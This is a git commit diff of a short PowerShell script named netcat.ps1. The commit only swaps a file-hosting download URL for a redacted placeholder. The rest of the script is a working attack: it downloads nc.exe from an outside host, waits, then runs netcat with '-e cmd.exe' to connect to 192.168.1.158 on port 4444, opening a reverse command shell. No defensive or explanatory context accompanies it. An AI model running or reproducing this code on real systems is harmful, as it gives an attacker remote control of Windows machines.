b241a6456ddf90cd5fdf6dc37f5e12583293375a
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-04-24 00:06:25 +0100

    Update netcat.ps1

--- netcat.ps1
+++ netcat.ps1
@@ -1,3 +1,3 @@
-(New-Object net.webclient).DownloadFile("https://tmpfiles.org/download/46233/nc.exe", "C:\seclogs\nc.exe")
+(New-Object net.webclient).DownloadFile("https://XXXXXXXXXXXXXXXXX/nc.exe", "C:\seclogs\nc.exe")
 Start-Sleep -Seconds 5
 nc.exe 192.168.1.158 4444 -e cmd.exe
